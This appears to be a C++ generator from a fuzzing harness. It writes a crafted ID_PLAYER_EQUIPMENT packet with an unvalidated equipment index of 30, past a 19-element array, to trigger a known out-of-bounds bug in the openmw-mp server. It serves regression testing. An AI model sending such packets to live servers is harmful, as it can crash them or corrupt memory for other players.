// mk-control: emit the known-positive control input for the F-001 equipment out-of-bounds.
//
// WHY A GENERATOR AND NOT A CHECKED-IN BLOB. A control input is the thing that proves a campaign
// can still rediscover a bug you already reproduced; if it silently stops triggering, every "no
// crashes" result after that is uninterpretable. A blob cannot tell you WHY it triggers, and it
// cannot be regenerated for a build whose packet-ID enum shifted. This builds the bytes from the
// real NetworkMessages.hpp enum and the real BitStream, so it is correct by construction for
// whatever tree it is compiled against.
//
// FORMAT, matching apps/openmw-mp dispatch and the tes3mp-bitstream harness:
//   byte 0        packet ID, consumed by PlayerPacketController::GetPacket()
//   then, bitwise, exactly what PacketPlayerEquipment::Packet() reads:
//     bool  exchangeFullInfo = false     (1 bit)   -> take the index-list branch
//     u32   count            = 1                   -> equipmentIndexChanges.resize(1)
//     int   equipmentIndex   = 30                  -> UNVALIDATED. Item equipmentItems[19].
//     then ExchangeItemInformation() on equipmentItems[30]: refId, count, charge, enchantmentCharge
//
// BasePacket::Packet() writes the id and GUID only on the SEND path, so a read-side stream starts
// directly at exchangeFullInfo and no GUID is prepended here.
//
// Index 30 is deliberate: far enough past the 19-element array that the access is unambiguously
// out of bounds for ASan, without being so far that it leaves the heap chunk entirely and turns a
// clean container-overflow report into a wild-address SEGV.
#include <cstdio>
#include <cstdlib>
#include <BitStream.h>
#include <RakString.h>
#include <components/openmw-mp/NetworkMessages.hpp>

int main(int argc, char **argv)
{
    const char *out = argc > 1 ? argv[1] : "control_f001.bin";
    const int   idx = argc > 2 ? atoi(argv[2]) : 30;

    RakNet::BitStream bs;
    bool full = false;            bs.Write(full);
    uint32_t count = 1;           bs.Write(count);
    int equipmentIndex = idx;     bs.Write(equipmentIndex);
    RakNet::RakString refId("controlF001");
    RakNet::RakString::SerializeCompressed(refId.C_String(), &bs);
    int icount = 1, icharge = 0;  bs.Write(icount); bs.Write(icharge);
    float ench = 0.0f;            bs.Write(ench);

    FILE *f = fopen(out, "wb");
    if (!f) { perror(out); return 1; }
    unsigned char id = (unsigned char)ID_PLAYER_EQUIPMENT;
    fwrite(&id, 1, 1, f);
    fwrite(bs.GetData(), 1, BITS_TO_BYTES(bs.GetNumberOfBitsUsed()), f);
    fclose(f);
    fprintf(stderr, "wrote %s: ID_PLAYER_EQUIPMENT=%u, equipmentIndex=%d, %u payload bytes\n",
            out, id, equipmentIndex, (unsigned)BITS_TO_BYTES(bs.GetNumberOfBitsUsed()));
    return 0;
}
